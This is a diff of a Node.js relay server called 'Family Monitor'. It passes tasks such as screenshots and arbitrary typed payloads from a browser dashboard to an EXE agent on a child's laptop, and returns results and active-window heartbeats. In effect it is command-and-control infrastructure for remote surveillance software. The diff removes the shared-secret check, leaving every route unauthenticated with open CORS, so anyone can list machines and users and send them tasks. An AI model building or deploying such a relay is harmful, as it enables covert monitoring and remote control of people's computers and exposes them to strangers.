@@ -1,199 +1,218 @@
-const http = require('http');
+// Family Monitor Relay Server
+// Free deploy on Render.com as a Web Service
+// node server.js
+
+const http   = require('http');
 const crypto = require('crypto');
 
-const PORT   = process.env.PORT || 3000;
-const SECRET = process.env.FM_SECRET || 'fm2025secret';
+const PORT = process.env.PORT || 3000;
 
-// devices[deviceId] = { info, cmdQueue, responses, waitingDash, waitingPoll, lastSeen }
-const devices = {};
+// ── SESSION STORE ─────────────────────────────────────────────
+// sessions[id] = {
+//   info: { pc, user, home, win, mon },
+//   lastSeen: ms,
+//   taskQueue: [ {taskId, type, payload} ],
+//   results:   { taskId: {data:Buffer, ct:string} },
+//   waitDash:  { taskId: res },   // dashboard waiting for result
+//   waitAgent: fn                 // agent waiting for task
+// }
+const sessions = {};
 
-function getDevice(id) {
-    if (!devices[id]) devices[id] = {
-        info: {}, cmdQueue: [], responses: {},
-        waitingDash: {}, waitingPoll: null, lastSeen: 0
+function getSession(id) {
+    if (!sessions[id]) sessions[id] = {
+        info: {}, lastSeen: 0,
+        taskQueue: [], results: {},
+        waitDash: {}, waitAgent: null
     };
-    return devices[id];
+    return sessions[id];
 }
 
-// Cleanup old devices every hour
+// Prune old sessions hourly
 setInterval(() => {
-    const cutoff = Date.now() - 24*3600*1000;
-    for (const id in devices) if (devices[id].lastSeen < cutoff) delete devices[id];
-}, 3600*1000);
+    const cut = Date.now() - 86400000;
+    for (const id in sessions)
+        if (sessions[id].lastSeen < cut) delete sessions[id];
+}, 3600000);
 
-function readBody(req) {
-    return new Promise(resolve => {
-        const chunks = [];
-        req.on('data', c => chunks.push(c));
-        req.on('end', () => resolve(Buffer.concat(chunks)));
+// ── HTTP HELPERS ──────────────────────────────────────────────
+const CORS = {
+    'Access-Control-Allow-Origin':  '*',
+    'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type,x-agent-id',
+};
+
+function body(req) {
+    return new Promise(r => {
+        const c = [];
+        req.on('data', d => c.push(d));
+        req.on('end',  () => r(Buffer.concat(c)));
     });
 }
 
-function sendJson(res, code, obj) {
+function json(res, code, obj) {
     const b = Buffer.from(JSON.stringify(obj));
-    res.writeHead(code, {
-        'Content-Type': 'application/json',
-        'Content-Length': b.length,
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Headers': 'Content-Type,x-fm-secret',
-        'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
-    });
+    res.writeHead(code, { ...CORS, 'Content-Type': 'application/json', 'Content-Length': b.length });
     res.end(b);
 }
 
-function sendBuf(res, buf, ct) {
-    res.writeHead(200, {
-        'Content-Type': ct,
-        'Content-Length': buf.length,
-        'Access-Control-Allow-Origin': '*',
-    });
+function raw(res, buf, ct) {
+    res.writeHead(200, { ...CORS, 'Content-Type': ct, 'Content-Length': buf.length });
     res.end(buf);
 }
 
+// ── ROUTING ───────────────────────────────────────────────────
 http.createServer(async (req, res) => {
-    if (req.method === 'OPTIONS') {
-        res.writeHead(204, {
-            'Access-Control-Allow-Origin': '*',
-            'Access-Control-Allow-Headers': 'Content-Type,x-fm-secret',
-            'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
-        });
-        return res.end();
-    }
-
-    const u = new URL(req.url, 'http://x');
+    const u    = new URL(req.url, 'http://x');
     const path = u.pathname;
-    const qs = u.searchParams;
+    const qs   = u.searchParams;
 
-    // ── DEVICE ROUTES (called by EXE) ──
-    if (req.headers['x-fm-secret'] !== SECRET && path.startsWith('/d/')) {
-        return sendJson(res, 401, { error: 'unauthorized' });
+    // Preflight
+    if (req.method === 'OPTIONS') {
+        res.writeHead(204, CORS); res.end(); return;
     }
 
-    // POST /d/hello  { deviceId, pc, user, home }
-    if (path === '/d/hello' && req.method === 'POST') {
-        const body = JSON.parse((await readBody(req)).toString());
-        const d = getDevice(body.deviceId);
-        d.info = { ...body, online: true };
-        d.lastSeen = Date.now();
-        console.log('HELLO', body.deviceId, body.pc, body.user);
-        return sendJson(res, 200, { ok: true });
-    }
-
-    // GET /d/poll?id=xxx  long-poll for next command
-    if (path === '/d/poll' && req.method === 'GET') {
-        const id = qs.get('id');
-        const d = getDevice(id);
-        d.info.online = true;
-        d.lastSeen = Date.now();
-
-        if (d.cmdQueue.length > 0) return sendJson(res, 200, d.cmdQueue.shift());
-
-        let timer;
-        d.waitingPoll = (cmd) => {
-            clearTimeout(timer);
-            d.waitingPoll = null;
-            if (!res.headersSent) sendJson(res, 200, cmd || { type: 'noop' });
-        };
-        timer = setTimeout(() => d.waitingPoll && d.waitingPoll(null), 25000);
-        req.on('close', () => { clearTimeout(timer); d.waitingPoll = null; });
-        return;
-    }
-
-    // POST /d/resp?id=xxx&reqId=xxx&ct=xxx  device sends response
-    if (path === '/d/resp' && req.method === 'POST') {
-        const id    = qs.get('id');
-        const reqId = qs.get('reqId');
-        const ct    = qs.get('ct') || 'application/json';
-        const body  = await readBody(req);
-        const d = getDevice(id);
-        d.lastSeen = Date.now();
-
-        if (d.waitingDash[reqId]) {
-            const dashRes = d.waitingDash[reqId];
-            delete d.waitingDash[reqId];
-            if (!dashRes.headersSent) sendBuf(dashRes, body, ct);
-        } else {
-            d.responses[reqId] = { body, ct };
-        }
-        return sendJson(res, 200, { ok: true });
-    }
-
-    // POST /d/beat?id=xxx  heartbeat with active window
-    if (path === '/d/beat' && req.method === 'POST') {
-        const id   = qs.get('id');
-        const body = JSON.parse((await readBody(req)).toString());
-        const d = getDevice(id);
-        d.lastSeen = Date.now();
-        d.info.online = true;
-        d.info.activeWindow = body.w || '';
-        d.info.monitoring   = body.m !== false;
-        return sendJson(res, 200, { ok: true });
-    }
-
-    // ── DASHBOARD ROUTES (called by browser) ──
-
-    // GET /dash/devices
-    if (path === '/dash/devices') {
-        const list = Object.entries(devices).map(([id, d]) => ({
-            deviceId:     id,
-            pc:           d.info.pc || id,
-            user:         d.info.user || '?',
-            home:         d.info.home || '',
-            online:       d.info.online && (Date.now() - d.lastSeen < 35000),
-            lastSeen:     d.lastSeen,
-            activeWindow: d.info.activeWindow || '',
-            monitoring:   d.info.monitoring !== false,
-        }));
-        return sendJson(res, 200, list);
-    }
-
-    // POST /dash/cmd  { deviceId, type, payload }  → response from device
-    if (path === '/dash/cmd' && req.method === 'POST') {
-        const body = JSON.parse((await readBody(req)).toString());
-        const { deviceId: id, type, payload } = body;
-        const d = devices[id];
-        if (!d) return sendJson(res, 404, { error: 'device not found' });
-
-        const reqId = crypto.randomBytes(8).toString('hex');
-        const cmd   = { type, payload, reqId };
-        const timeout = type === 'screenshot' ? 15000 : 10000;
-
-        // Check if device already sent response
-        if (d.responses[reqId]) {
-            const r = d.responses[reqId];
-            delete d.responses[reqId];
-            return sendBuf(res, r.body, r.ct);
-        }
-
-        // Park dashboard response, push cmd to device
-        d.waitingDash[reqId] = res;
-
-        if (d.waitingPoll) {
-            const resolve = d.waitingPoll;
-            d.waitingPoll = null;
-            resolve(cmd);
-        } else {
-            d.cmdQueue.push(cmd);
-        }
-
-        const t = setTimeout(() => {
-            delete d.waitingDash[reqId];
-            if (!res.headersSent) sendJson(res, 504, { error: 'device timeout' });
-        }, timeout);
-
-        req.on('close', () => {
-            clearTimeout(t);
-            delete d.waitingDash[reqId];
-        });
-        return;
-    }
-
-    // GET /  health check
+    // ── HEALTH CHECK ──────────────────────────────────────────
     if (path === '/') {
         res.writeHead(200, { 'Content-Type': 'text/plain' });
-        return res.end('Family Monitor Relay\n');
+        res.end('Family Monitor Relay\n'); return;
     }
 
-    sendJson(res, 404, { error: 'not found' });
+    // ════════════════════════════════════════════════════════
+    // AGENT ROUTES  (called by EXE on kid's laptop)
+    // ════════════════════════════════════════════════════════
 
-.listen(PORT, '0.0.0.0', () => console.log('Relay on port', PORT));
+    // POST /agent/hello
+    // Body: { id, pc, user, home }
+    if (path === '/agent/hello' && req.method === 'POST') {
+        const b = JSON.parse((await body(req)).toString());
+        const s = getSession(b.id);
+        s.info     = { pc: b.pc, user: b.user, home: b.home, win: '', mon: true };
+        s.lastSeen = Date.now();
+        console.log('[+]', b.id, b.pc, b.user);
+        return json(res, 200, { ok: true });
+    }
+
+    // GET /agent/poll?id=xxx
+    // Agent hangs here waiting for a task (25s long-poll)
+    if (path === '/agent/poll' && req.method === 'GET') {
+        const id = qs.get('id');
+        const s  = getSession(id);
+        s.lastSeen = Date.now();
+        s.info.online = true;
+
+        // Task already queued?
+        if (s.taskQueue.length > 0) {
+            return json(res, 200, s.taskQueue.shift());
+        }
+
+        // Wait for a task
+        let timer;
+        s.waitAgent = (task) => {
+            clearTimeout(timer);
+            s.waitAgent = null;
+            if (!res.headersSent) json(res, 200, task || { type: 'noop' });
+        };
+        timer = setTimeout(() => { if (s.waitAgent) s.waitAgent(null); }, 25000);
+        req.on('close', () => { clearTimeout(timer); s.waitAgent = null; });
+        return;
+    }
+
+    // POST /agent/result?id=xxx&taskId=xxx&ct=xxx
+    // Agent returns result for a task
+    if (path === '/agent/result' && req.method === 'POST') {
+        const id     = qs.get('id');
+        const taskId = qs.get('taskId');
+        const ct     = qs.get('ct') || 'application/json';
+        const buf    = await body(req);
+        const s      = getSession(id);
+        s.lastSeen   = Date.now();
+
+        // Is dashboard waiting for this result?
+        if (s.waitDash[taskId]) {
+            const dashRes = s.waitDash[taskId];
+            delete s.waitDash[taskId];
+            if (!dashRes.headersSent) raw(dashRes, buf, ct);
+        } else {
+            // Cache it briefly
+            s.results[taskId] = { data: buf, ct };
+            setTimeout(() => delete s.results[taskId], 30000);
+        }
+        return json(res, 200, { ok: true });
+    }
+
+    // POST /agent/beat?id=xxx
+    // Heartbeat with active window + monitor state
+    if (path === '/agent/beat' && req.method === 'POST') {
+        const id  = qs.get('id');
+        const b2  = JSON.parse((await body(req)).toString());
+        const s   = getSession(id);
+        s.lastSeen       = Date.now();
+        s.info.online    = true;
+        s.info.win       = b2.win  || '';
+        s.info.mon       = b2.mon  !== false;
+        return json(res, 200, { ok: true });
+    }
+
+    // ════════════════════════════════════════════════════════
+    // DASHBOARD ROUTES  (called by browser)
+    // ════════════════════════════════════════════════════════
+
+    // GET /dash/sessions
+    // Returns list of all known agents
+    if (path === '/dash/sessions') {
+        const list = Object.entries(sessions).map(([id, s]) => ({
+            id,
+            pc:      s.info.pc    || id,
+            user:    s.info.user  || '?',
+            home:    s.info.home  || '',
+            win:     s.info.win   || '',
+            mon:     s.info.mon   !== false,
+            online:  s.info.online && (Date.now() - s.lastSeen < 35000),
+            seen:    s.lastSeen,
+        }));
+        return json(res, 200, list);
+    }
+
+    // POST /dash/task
+    // Body: { id, type, payload }
+    // Sends a task to the agent and waits for result (long-poll)
+    if (path === '/dash/task' && req.method === 'POST') {
+        const b3     = JSON.parse((await body(req)).toString());
+        const id     = b3.id;
+        const s      = sessions[id];
+        if (!s) return json(res, 404, { error: 'agent not found' });
+
+        const taskId  = crypto.randomBytes(8).toString('hex');
+        const task    = { taskId, type: b3.type, payload: b3.payload || '' };
+        const timeout = b3.type === 'screenshot' ? 15000 : 10000;
+
+        // Deliver task to agent
+        if (s.waitAgent) {
+            const wa = s.waitAgent;
+            s.waitAgent = null;
+            wa(task);
+        } else {
+            s.taskQueue.push(task);
+        }
+
+        // Wait for result
+        if (s.results[taskId]) {
+            const r = s.results[taskId];
+            delete s.results[taskId];
+            return raw(res, r.data, r.ct);
+        }
+
+        s.waitDash[taskId] = res;
+        const t = setTimeout(() => {
+            delete s.waitDash[taskId];
+            if (!res.headersSent) json(res, 504, { error: 'agent timeout - is the EXE running?' });
+        }, timeout);
+        req.on('close', () => { clearTimeout(t); delete s.waitDash[taskId]; });
+        return;
+    }
+
+    json(res, 404, { error: 'not found' });
+
+}).listen(PORT, '0.0.0.0', () => {
+    console.log('Family Monitor Relay on port', PORT);
+});
